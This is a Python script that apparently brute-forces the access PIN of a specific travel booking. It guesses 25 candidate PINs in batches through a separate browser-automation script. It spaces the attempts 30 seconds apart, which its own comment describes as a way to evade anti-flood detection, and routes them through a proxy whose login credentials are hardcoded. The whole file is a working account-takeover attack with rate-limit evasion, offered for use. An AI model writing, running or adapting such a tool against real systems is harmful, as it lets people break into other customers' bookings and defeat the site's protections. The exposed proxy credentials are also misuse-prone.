#!/usr/bin/env python3
"""
🎯 SEQUENTIAL SQUAD MANAGER - One Agent at a Time
Each agent tries 5 PINs, then 30s wait, then next agent
Anti-flood detection through time spacing
"""

import subprocess
import time
import json
import os
from datetime import datetime
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

class SequentialSquad:
    def __init__(self):
        # TARGET INTEL
        self.booking_id = "5727559423"
        
        # PIN ARSENAL (25 PINs - 1 is correct)
        self.all_pins = [
            "1552", "1614", "2088", "4983", "5611", 
            "6291", "1562", "7415", "2148", "7781", 
            "1688", "1797", "1759", "5585", "3008", 
            "2390", "2963", "1691", "1937", "7185", 
            "1560", "1322", "8948", "8518", "1749"
        ]
        
        # SQUAD CONFIGURATION
        self.squad_size = 5
        self.pins_per_agent = 5
        self.wait_between_agents = 30  # 30 seconds between agents
        
        # LOGGING
        self.log_file = f"sequential_log_{self.booking_id}.txt"
        self.success_file = f"VICTORY_{self.booking_id}.json"
        
        # PROXY CONFIGURATION
        self.proxy_config = {
            "server": "http://pr.oxylabs.io:7777",
            "username": "customer-oxy1p_hnzsA",
            "password": "oxy1p_hnzsA1"
        }
        
    def distribute_pins(self):
        """Distribute 25 PINs across 5 agents (5 PINs each)"""
        pin_batches = []
        for i in range(0, len(self.all_pins), self.pins_per_agent):
            batch = self.all_pins[i:i + self.pins_per_agent]
            pin_batches.append(batch)
        return pin_batches
    
    def deploy_sequential_squad(self):
        """Deploy agents one by one with 30s gaps"""
        print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                  🎯 SEQUENTIAL SQUAD DEPLOYMENT INITIATED 🎯                ║
║                                                                              ║
║  Target Booking: {self.booking_id}                                          ║
║  Squad Size: {self.squad_size} agents                                       ║
║  Total PINs: {len(self.all_pins)} PINs                                      ║
║  Strategy: Sequential agent deployment                                      ║
║  Agent Gap: {self.wait_between_agents} seconds between agents              ║
║                                                                              ║
║                   🚀 DEPLOYING SEQUENTIAL SQUAD! 🚀                         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
        
        # Distribute PINs
        pin_batches = self.distribute_pins()
        
        # Deploy agents sequentially
        for i, pin_batch in enumerate(pin_batches, 1):
            agent_id = f"A{i}"
            
            print(f"\n{Fore.YELLOW}🚀 DEPLOYING AGENT {agent_id}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}🔑 Agent {agent_id} PINs: {','.join(pin_batch)}{Style.RESET_ALL}")
            
            # Run single agent with boss_ai_playwright_pin1.py
            pins_string = ",".join(pin_batch)
            command = [
                r".\venv\Scripts\python.exe", "boss_ai_playwright_pin1.py",
                "--confirmation", self.booking_id,
                "--pins", pins_string,
                "--wait", "10"
            ]
            
            print(f"{Fore.BLUE}📡 Command: {' '.join(command)}{Style.RESET_ALL}")
            
            try:
                # Run agent and wait for completion
                result = subprocess.run(command, capture_output=True, text=True, timeout=300)
                
                print(f"{Fore.CYAN}📋 Agent {agent_id} Output:{Style.RESET_ALL}")
                print(result.stdout)
                
                if result.stderr:
                    print(f"{Fore.RED}⚠️ Agent {agent_id} Errors:{Style.RESET_ALL}")
                    print(result.stderr)
                
                # Check if success was found
                if "SUCCESS!" in result.stdout:
                    print(f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    🎉 SEQUENTIAL SQUAD SUCCESS! 🎉                          ║
║                                                                              ║
║  Victorious Agent: {agent_id}                                               ║
║  Target: {self.booking_id}                                                  ║
║                                                                              ║
║                         🏆 VICTORY ACHIEVED! 🏆                             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
                    break
                
                print(f"{Fore.GREEN}✅ Agent {agent_id} completed mission{Style.RESET_ALL}")
                
            except subprocess.TimeoutExpired:
                print(f"{Fore.RED}⏰ Agent {agent_id} timed out after 5 minutes{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}❌ Agent {agent_id} error: {e}{Style.RESET_ALL}")
            
            # Wait between agents (except for last agent)
            if i < len(pin_batches):
                print(f"\n{Fore.YELLOW}⏳ Waiting {self.wait_between_agents} seconds before next agent...{Style.RESET_ALL}")
                for countdown in range(self.wait_between_agents, 0, -1):
                    print(f"{Fore.YELLOW}⏱️ Next agent in: {countdown}s{Style.RESET_ALL}", end="\r")
                    time.sleep(1)
                print()  # New line after countdown
        
        print(f"\n{Fore.CYAN}🧹 Sequential squad deployment complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    squad = SequentialSquad()
    squad.deploy_sequential_squad()